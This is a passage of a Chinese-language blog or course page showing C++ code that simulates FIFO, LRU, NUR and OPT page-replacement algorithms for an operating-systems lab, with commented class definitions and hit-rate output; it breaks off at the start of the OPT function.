class="title">CPageControl</span> * <span class="title">m_pNext</span>;</span><span class="comment">//指示下一个页面</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="CMemory类"><a href="#CMemory类" class="headerlink" title="CMemory类"></a>CMemory类</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CMemory</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CMemory();<span class="comment">//构造函数，用来初始化变量</span></span><br><span class="line">    <span class="comment">//参数nTotal_pf表示分配的内存页面个数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initialize</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span></span>;<span class="comment">//初始化函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FIFO</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LRU</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NUR</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OPT</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="built_in">vector</span>&lt;CPage&gt; _vDiscPages;<span class="comment">//进程使用的页向量,包含该进程空间内的所有页 </span></span><br><span class="line"><span class="built_in">vector</span>&lt;CPageControl&gt; _vMemoryPages;<span class="comment">//为进程分配的物理内存页向量</span></span><br><span class="line">CPageControl *_pFreepf_head;<span class="comment">//空闲物理页头指针，用于LRU算法 </span></span><br><span class="line">CPageControl *_pBusypf_head;<span class="comment">//已使用页面头指针，用于FIFO算法</span></span><br><span class="line">    CPageControl *_pBusypf_tail;<span class="comment">//已使用页面尾指针，用于FIFO算法</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; _vMain;<span class="comment">//_vMain表示某进程随机产生的指令序列</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; _vPage;<span class="comment">//_vPage表示待处理指令对应的页号 </span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; _vOffset;<span class="comment">//_vOffset表示剩余待处理的指令数</span></span><br><span class="line"><span class="keyword">int</span> _nDiseffect;<span class="comment">//换入页面次数，即未命中次数 </span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="CMemory类的构造函数"><a href="#CMemory类的构造函数" class="headerlink" title="CMemory类的构造函数"></a>CMemory类的构造函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">CMemory::CMemory():<span class="comment">//构造函数</span></span><br><span class="line">    _vDiscPages(TOTAL_VP),</span><br><span class="line">_vMemoryPages(TOTAL_VP),</span><br><span class="line">_vMain(TOTAL_INSTRUCTION),</span><br><span class="line">_vPage(TOTAL_INSTRUCTION),</span><br><span class="line">_vOffset(TOTAL_INSTRUCTION) &#123;</span><br><span class="line"><span class="keyword">int</span> S,i,nRand;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">通过随机数产生一个指令序列(实际上是指令的逻辑地址序列)，共320条指令。</span></span><br><span class="line"><span class="comment">指令的地址按下述原则生成：</span></span><br><span class="line"><span class="comment">A：50%的指令是顺序执行的</span></span><br><span class="line"><span class="comment">B：25%的指令要实现向前跳转，均匀分布在前地址部分</span></span><br><span class="line"><span class="comment">C：25%的指令要实现向后跳转，均匀分布在后地址部分</span></span><br><span class="line"><span class="comment">函数void srand(unsigned seed)；参数seed是rand()的种子，</span></span><br><span class="line"><span class="comment">用来初始化rand()的起始值。</span></span><br><span class="line"><span class="comment">由于每次运行时进程号不同，故可用来作为初始化随机数队列的“种子”</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line">srand(getpid()*<span class="number">10</span>);</span><br><span class="line">        <span class="comment">/* 函数int rand(void)；从srand (seed)中指定的seed开始，</span></span><br><span class="line"><span class="comment">        返回一个[seed,RAND_MAX（32767）)间的随机整数。 */</span></span><br><span class="line">nRand=rand()%<span class="number">32767</span>; </span><br><span class="line">S=(<span class="keyword">float</span>)<span class="number">319</span>*nRand/<span class="number">32767</span>+<span class="number">1</span>;<span class="comment">//计算第一条指令的地址S </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i+=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">_vMain[i]=S;<span class="comment">//地址S存入_Main[i]</span></span><br><span class="line">_vMain[i+<span class="number">1</span>]=_vMain[i]+<span class="number">1</span>;<span class="comment">//顺序执行S的下一条指令 </span></span><br><span class="line">            <span class="comment">/* 计算S的一条任意的前地址指令的地址S'属于[0，S+1],</span></span><br><span class="line"><span class="comment">            并存入_Main[i+2],表示向前跳转 */</span></span><br><span class="line">nRand=rand()%<span class="number">32767</span>;</span><br><span class="line">_vMain[i+<span class="number">2</span>]=(<span class="keyword">float</span>)_vMain[i]*nRand/<span class="number">32767</span>;</span><br><span class="line">_vMain[i+<span class="number">3</span>]=_vMain[i+<span class="number">2</span>]+<span class="number">1</span>;<span class="comment">//顺序执行S'下一条指令 </span></span><br><span class="line">            <span class="comment">/* 计算S'的一条任意的后指令地址S属于[S'+1,319],表示向后跳转 */</span></span><br><span class="line">nRand=rand()%<span class="number">32767</span>; </span><br><span class="line">S=(<span class="keyword">float</span>)nRand*(<span class="number">318</span>-_vMain[i+<span class="number">2</span>])/<span class="number">32767</span>+_vMain[i+<span class="number">2</span>]+<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">将指令序列变成页地址流</span></span><br><span class="line"><span class="comment">页面大小为1K；</span></span><br><span class="line"><span class="comment">用户内存容量4页到32页；</span></span><br><span class="line"><span class="comment">用户虚存容量为32K.</span></span><br><span class="line"><span class="comment">在用户虚存中，按每K存放10条指令排列虚存地址，即320条指令在虚存中的存放方式为：</span></span><br><span class="line"><span class="comment">第0 条-第9 条指令为第0页（对应逻辑地址为[0，9]）</span></span><br><span class="line"><span class="comment">第10条-第19条指令为第1页（对应逻辑地址为[10，19]）</span></span><br><span class="line"><span class="comment">………………………………</span></span><br><span class="line"><span class="comment">第310条-第319条指令为第31页（对应逻辑地址为[310，319]）</span></span><br><span class="line"><span class="comment">按以上方式，用户指令可组成32页。</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line">_vPage[i]=_vMain[i]/<span class="number">10</span>;</span><br><span class="line">_vOffset[i]=_vMain[i]%<span class="number">10</span>;</span><br><span class="line">_vPage[i]%=<span class="number">32</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类成员函数initialize-const-int-nTotal-pf"><a href="#类成员函数initialize-const-int-nTotal-pf" class="headerlink" title="类成员函数initialize(const int nTotal_pf)"></a>类成员函数initialize(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMemory::initialize(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span><br><span class="line">&#123;<span class="comment">//初始化函数，参数表示分配的内存页面个数</span></span><br><span class="line"><span class="keyword">int</span> ix;<span class="comment">//辅助变量，用于计数</span></span><br><span class="line">_nDiseffect=<span class="number">0</span>;<span class="comment">//换入页面次数置零</span></span><br><span class="line"><span class="keyword">for</span>(ix=<span class="number">0</span>;ix&lt;_vDiscPages.<span class="built_in">size</span>();ix++)<span class="comment">//初始化进程使用的页向量</span></span><br><span class="line">&#123;</span><br><span class="line">_vDiscPages[ix].m_nPageNumber=ix;</span><br><span class="line">_vDiscPages[ix].m_nPageFaceNumber=INVALID;</span><br><span class="line">_vDiscPages[ix].m_nCounter=<span class="number">0</span>;</span><br><span class="line">_vDiscPages[ix].m_nTime=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(ix=<span class="number">1</span>;ix&lt;nTotal_pf;ix++)<span class="comment">//初始化为进程分配的物理内存页向量</span></span><br><span class="line">&#123;</span><br><span class="line">_vMemoryPages[ix<span class="number">-1</span>].m_pNext=&amp;_vMemoryPages[ix];</span><br><span class="line">_vMemoryPages[ix<span class="number">-1</span>].m_nPageFaceNumber=ix<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">_vMemoryPages[nTotal_pf<span class="number">-1</span>].m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">_vMemoryPages[nTotal_pf<span class="number">-1</span>].m_nPageFaceNumber=nTotal_pf<span class="number">-1</span>;</span><br><span class="line">_pFreepf_head=&amp;_vMemoryPages[<span class="number">0</span>];<span class="comment">//初始化空闲物理页头指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类成员函数FIFO-const-int-nTotal-pf"><a href="#类成员函数FIFO-const-int-nTotal-pf" class="headerlink" title="类成员函数FIFO(const int nTotal_pf)"></a>类成员函数FIFO(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMemory::FIFO(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//辅助变量，用于计数</span></span><br><span class="line">CPageControl *p;<span class="comment">//辅助变量，用于中间过渡</span></span><br><span class="line">initialize(nTotal_pf);<span class="comment">//初始化</span></span><br><span class="line">_pBusypf_head=_pBusypf_tail=<span class="literal">NULL</span>;<span class="comment">//将已使用页面的头指针和尾指针置空</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">&#123;<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">_nDiseffect+=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)  <span class="comment">//如果分配给进程的物理内存页面无空闲 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 将队列中最先进入的(就是队列第一个单元)pagecontrol单元“清干净”*/</span> </span><br><span class="line">p=_pBusypf_head-&gt;m_pNext;</span><br><span class="line">                <span class="comment">//将p指向已使用头指针指向的页面的下一个页面，即第二个已使用的页面 </span></span><br><span class="line">_vDiscPages[_pBusypf_head-&gt;m_nPageNumber].</span><br><span class="line">                    m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将已使用页面头指针指向的内存单元清理干净 </span></span><br><span class="line">_pFreepf_head=_pBusypf_head;<span class="comment">//将已使用页面头指针置为空闲页面头指针 </span></span><br><span class="line">_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲页面头指针的下一个指针置空 </span></span><br><span class="line">_pBusypf_head=p;<span class="comment">//将已使用页面头指针指向下一个页面 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 将待处理指令对应的页面调入内存 */</span> </span><br><span class="line">p=_pFreepf_head-&gt;m_pNext;<span class="comment">//将p指向空闲头指针的指向的页面的下一个页面 </span></span><br><span class="line">_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲头指针指向页面的下一个页面置空 </span></span><br><span class="line">_pFreepf_head-&gt;m_nPageNumber=_vPage[i];</span><br><span class="line">            <span class="comment">//将待处理指令对应的页号放入空闲头指针指向的页面的页号中 </span></span><br><span class="line">_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">            <span class="comment">//将进程页向量的页号置为待处理指令对应的页号 </span></span><br><span class="line"><span class="keyword">if</span>(_pBusypf_tail==<span class="literal">NULL</span>)</span><br><span class="line">&#123;<span class="comment">//如果已使用页面尾指针为空，即在此之前内存没有被占用 </span></span><br><span class="line">_pBusypf_head=_pBusypf_tail=_pFreepf_head; </span><br><span class="line">                <span class="comment">//将已使用页面的头指针、尾指针都指向的页面即待处理指令 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//如果已使用页面尾指针不为空，即在此之前已经有页面放入内存中 </span></span><br><span class="line">_pBusypf_tail-&gt;m_pNext=_pFreepf_head;</span><br><span class="line">                <span class="comment">//已使用页面的尾指针的下一个指针指向空闲页面头指针指向的页面 </span></span><br><span class="line">_pBusypf_tail=_pFreepf_head;</span><br><span class="line">                <span class="comment">//已使用页面的尾指针指向空闲页面头指针指向的页面 </span></span><br><span class="line">&#125;</span><br><span class="line">_pFreepf_head=p;<span class="comment">//将空闲页面的头指针指向下一个页面 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="built_in">cout</span>&lt;&lt;<span class="string">"FIFO: "</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="keyword">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">    <span class="comment">//打印出命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类成员函数LRU-const-int-nTotal-pf"><a href="#类成员函数LRU-const-int-nTotal-pf" class="headerlink" title="类成员函数LRU(const int nTotal_pf)"></a>类成员函数LRU(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMemory::LRU(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,nMin,minj,nPresentTime(<span class="number">0</span>);<span class="comment">//辅助变量，用于计数和作为中间变量过渡 </span></span><br><span class="line">initialize(nTotal_pf);<span class="comment">//初始化 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">&#123;<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">_nDiseffect++;</span><br><span class="line"><span class="comment">/* 寻找最近最少使用的页面并将其调出内存 */</span> </span><br><span class="line"><span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)<span class="comment">//如果分配给进程的物理内存页面无空闲</span></span><br><span class="line">&#123;</span><br><span class="line">    nMin=<span class="number">32767</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">循环结束后，得到最近最少使用的页面的页号,</span></span><br><span class="line"><span class="comment">nMin表示最近最少使用页面的访问次数;</span></span><br><span class="line"><span class="comment">minj表示需要换出的页号</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((nMin&gt;_vDiscPages[j].m_nTime)&amp;&amp;</span><br><span class="line">                       (_vDiscPages[j].m_nPageFaceNumber!=INVALID)) </span><br><span class="line">&#123;<span class="comment">//进程页面访问次数小于nMin且页面页号在物理内存中 </span></span><br><span class="line">nMin=_vDiscPages[j].m_nTime;</span><br><span class="line">    minj=j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[minj].</span><br><span class="line">                                             m_nPageFaceNumber];</span><br><span class="line">                <span class="comment">//将空闲页面的头指针指向需要换出的页号</span></span><br><span class="line">_vDiscPages[minj].m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将需要换出的页面移出物理内存 </span></span><br><span class="line">_vDiscPages[minj].m_nTime=<span class="number">-1</span>;<span class="comment">//将需要换出的页面的访问次数设置为-1 </span></span><br><span class="line">_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;<span class="comment">//将空闲头指针的下一个指针置空 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 将待执行指令的页面调入内存 */</span> </span><br><span class="line">_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">            <span class="comment">//将需要换入的页面的页号置为之前空闲头指针指向的页面的页号，</span></span><br><span class="line">            <span class="comment">//即将要换入的页面放入内存中 </span></span><br><span class="line">_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">            <span class="comment">//将要放入的页面的访问次数设置为nPresentTime </span></span><br><span class="line">_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">            <span class="comment">//将空闲头指针指向下一个指针指向的页面 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//如果页面页号已经在物理内存中 </span></span><br><span class="line">_vDiscPages[_vPage[i]].m_nTime=nPresentTime;</span><br><span class="line">            <span class="comment">//将页面的访问次数设置为nPresentTime</span></span><br><span class="line">&#125;</span><br><span class="line">nPresentTime++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"LRU: "</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="keyword">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">    <span class="comment">//打印出命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类成员函数NUR-const-int-nTotal-pf"><a href="#类成员函数NUR-const-int-nTotal-pf" class="headerlink" title="类成员函数NUR(const int nTotal_pf)"></a>类成员函数NUR(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CMemory::NUR(<span class="keyword">const</span> <span class="keyword">int</span> nTotal_pf)&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,nDiscPage,nOld_DiscPage;</span><br><span class="line"><span class="keyword">bool</span> bCont_flag;<span class="comment">//设置循环条件 </span></span><br><span class="line">initialize(nTotal_pf);<span class="comment">//初始化 </span></span><br><span class="line">nDiscPage=<span class="number">0</span>;<span class="comment">//将nDiscPage置为0 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID)</span><br><span class="line">&#123;<span class="comment">//如果页面页号不在物理内存中</span></span><br><span class="line">_nDiseffect++;</span><br><span class="line"><span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>) </span><br><span class="line">&#123;<span class="comment">//如果分配给进程的物理内存页面无空闲，则将最近未使用的页面调出内存 </span></span><br><span class="line">    bCont_flag=<span class="literal">true</span>;</span><br><span class="line">    nOld_DiscPage=nDiscPage;</span><br><span class="line"><span class="keyword">while</span>(bCont_flag)</span><br><span class="line">&#123;</span><br><span class="line">                    <span class="keyword">if</span>(_vDiscPages[nDiscPage].m_nCounter==<span class="number">0</span>&amp;&amp;</span><br><span class="line">                       _vDiscPages[nDiscPage].m_nPageFaceNumber!=INVALID) </span><br><span class="line">&#123;<span class="comment">//如果页面计数为零并且该页面的页号不在物理内存中 </span></span><br><span class="line">bCont_flag=<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//如果页面计数不为零并且该页面的页号在物理内存中  </span></span><br><span class="line">nDiscPage++;</span><br><span class="line"><span class="keyword">if</span>(nDiscPage==TOTAL_VP) </span><br><span class="line">&#123;<span class="comment">//一个循环后，重新置零 </span></span><br><span class="line">nDiscPage=<span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(nDiscPage==nOld_DiscPage)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++) </span><br><span class="line">&#123;<span class="comment">//将所有页面的计数清零</span></span><br><span class="line">_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[nDiscPage].</span><br><span class="line">                                             m_nPageFaceNumber];</span><br><span class="line">                <span class="comment">//将空闲页面的头指针指向该物理页面的页号 </span></span><br><span class="line">_vDiscPages[nDiscPage].m_nPageFaceNumber=INVALID;</span><br><span class="line">                <span class="comment">//将该物理页面的页号置为不在内存中 </span></span><br><span class="line">    _pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">                <span class="comment">//将空闲头指针的下一个地址设置为空 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 将待执行的指令的页面调入内存中 */</span> </span><br><span class="line">_vDiscPages[_vPage[i]].m_nPageFaceNumber=</span><br><span class="line">                _pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">            <span class="comment">//将待执行页面的页号设置为空闲头指针指向的页号 </span></span><br><span class="line">_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">            <span class="comment">//将空闲头指针指向下一个页面 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="comment">//如果页面页号已经在物理内存中 </span></span><br><span class="line">_vDiscPages[_vPage[i]].m_nCounter=<span class="number">1</span>;<span class="comment">//将该页面的计数＋1 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 定期将所有页面存放是否被CPU处理信息的属性均置于初始态 */</span> </span><br><span class="line"><span class="keyword">if</span>(i%CLEAR_PERIOD==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++) </span><br><span class="line">&#123;<span class="comment">//将所有页面的计数清零</span></span><br><span class="line">_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">cout</span>.setf(ios::fixed);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"NUR:"</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">6</span>)&lt;&lt;<span class="number">1</span>-(<span class="keyword">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">    <span class="comment">//打印命中率 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类成员函数OPT-const-int-nTotal-pf"><a href="#类成员函数OPT-const-int-nTotal-pf" class="headerlink" title="类成员函数OPT(const int nTotal_pf)"></a>类成员函数OPT(const int nTotal_pf)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 